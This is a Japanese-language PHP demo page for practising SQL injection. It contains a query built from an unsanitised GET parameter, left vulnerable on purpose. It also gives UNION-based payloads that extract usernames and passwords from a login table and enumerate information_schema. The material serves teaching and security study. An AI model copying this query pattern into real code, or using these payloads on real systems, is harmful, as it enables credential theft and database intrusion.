<?php
/*****
 * 前提条件：
 * 
 * １．下記のテーブルとデータが準備されている事
 * table login_user
 * |id|name|passwd|flg|
 * |1|Aさん|password1|1|
 * |2|Bさん|password2|0|
 * |3|Cさん|password3|0|
 * table menu
 * |id|menu_name|page|flg|
 * |1|ショップ|shop|0|
 * |2|入庫|stock|0|
 * |3|出庫|move|0|
 * |4|管理|management|1|
 * 
 * ２．接続先データベースはlocalhostに作成されている事。
 * 
 * ３．$user，$password ，$database にデータベース接続情報
 * ユーザー名、パスワード、データベース名を代入する。
 * $user     = "user_name";
 * $password = "user_password";
 * $database = "database_name";
 * 
 */ 

// SQL組み立て
$sql  = "";
if(isset($_GET['flg'])){
    $sql .= "SELECT id,menu_name,page FROM menu WHERE flg = ".$_GET['flg'].";";
}

// SQL実行
if ($sql != "") {
    try {
        $db = new PDO("mysql:host=localhost;dbname=$database", $user, $password);
        foreach($db->query($sql) as $rows) {
            $records[] = $rows;
        }
    } catch (PDOException $e) {
        echo "<div>Error:" . $e->getMessage() . "</div>";
        //die();
    }
}
?>
<html>
<head></head>
<body>
<h1>SQLインジェクションを試す</h1>
<h2>Input Admin Flg / Admin=1 User=0</h2>
<form method="get">
<input type="text" name="flg"></input>
<input type="submit"></input>
</form>
正常系：上記のフォームに「0」もしくは「1」を投げる。<br>
<br>
データベースに投げられるSQLは下記のようになる<br>
<div style="background-color: #d0d0d0; padding: 5px;">SELECT id,menu_name,page FROM menu WHERE flg = 0</div>
<br>
<h3>SQLインジェクションによりログインユーザー情報を引き抜くパターン</h3>
flgに「1」or「0」が投げられるところに、下記のSQLを投げるとログインユーザー情報を引き抜くことかできる。<br>
<div style="background-color: #d0d0d0; padding: 5px;">2 UNION SELECT null,null,(select CONCAT(id,"$",name,"$",passwd) from login_user limit 0,1)</div>
<br>
結果として投げられるSQL<br>
<div style="background-color: #d0d0d0; padding: 5px;">SELECT id,menu_name,page FROM menu WHERE flg = 2 UNION SELECT null,null,(select CONCAT(id,"$",name,"$",passwd) from login_user limit 0,1)</div>
<br>
<h3>データベースの定義情報を見る事でデータベース名・テーブル名・カラム名を確認する事もできます。</h3>
２．データベースのインフォメーションスキーマを確認するパターン<br>
<div style="background-color: #d0d0d0; padding: 5px;">2 UNION SELECT null,null,(SELECT CONCAT(table_schema,"$",table_name,"$",engine) FROM information_schema.tables limit 81,1)</div>
※limit 81 を指定している<br>
<br>
<h3>実行結果</h3>
----メニュー一覧----<br>
<div style="background-color: #d0d0d0; padding: 5px;">
<?php
    foreach($records as $recoed) {
        echo $recoed['menu_name'];
        echo "：";
        echo $recoed['page'];
        echo "<br>\n";
    }
?>
</div>
----print_r----<br>
<div style="background-color: #d0d0d0; padding: 5px;">
<?php
    if(isset($records)){
        print_r($records);
    }
?>
</div>
<br>
<br>
<br>
<br>
</body>
</html>
